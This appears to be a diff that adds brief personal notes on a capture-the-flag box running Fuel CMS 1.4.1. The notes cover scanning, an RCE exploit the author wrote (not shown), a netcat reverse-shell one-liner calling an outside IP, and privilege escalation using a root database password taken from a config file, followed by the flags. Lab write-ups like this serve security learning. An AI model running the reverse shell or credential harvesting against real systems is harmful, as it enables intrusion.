@@ -1,0 +1,28 @@
+-nmap
+-gobuster
+	-fuel cms 1.4.1
+		-while searching for exploit i found fuel cms remote code execution exploit 
+		 try to write my own exploit in python3
+		-exploit work and now we have remote code execution 
+
+
+	-now we want to get better shell let's try some ticks for get shell for rce
+		rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.28.51 1234 >/tmp/f
+
+	-got tty shell form python
+	
+
+	-user flag
+		6470e394cbf6dab6a91682cc8585059b
+
+-privileage escation
+	-while looking in fuel cms config file i found root user and password
+		-  'hostname' => 'localhost',
+	        'username' => 'root',
+    	    'password' => 'mememe',
+
+    	  /var/www/html/fuel/application/config
+
+
+   -root flag 
+   		b9bbcb33e11b80be759c4e844862482d
